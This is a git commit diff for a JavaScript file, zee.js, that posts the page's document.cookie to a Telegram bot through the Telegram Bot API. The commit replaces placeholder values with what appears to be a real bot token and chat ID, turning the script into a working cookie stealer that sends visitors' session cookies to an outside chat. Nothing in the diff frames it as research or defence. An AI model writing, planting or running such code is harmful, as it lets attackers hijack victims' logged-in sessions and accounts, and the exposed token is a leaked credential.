ee173c3ec9b986dc6b8a9386efd36d9b3b85cc59
greezeel48 <kevinletto35@gmail.com>
2024-07-18 00:56:58 +0700

    Update zee.js

--- zee.js
+++ zee.js
@@ -1,13 +1,13 @@
-const telegramToken = "1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-const chatId = "1234567890";
+const telegramToken = '6793665167:AAHlH0DyLyOi0To3qA1m53pEGY0TaI_AbKQ';
+const chatId = '6845769806';
 
 fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
-  method: "POST",
+  method: 'POST',
   headers: {
-    "Content-Type": "application/json",
+    'Content-Type': 'application/json'
   },
   body: JSON.stringify({
     chat_id: chatId,
-    text: `Cookies: ${document.cookie}`,
-  }),
+    text: `Cookies: ${document.cookie}`
+  })
 });
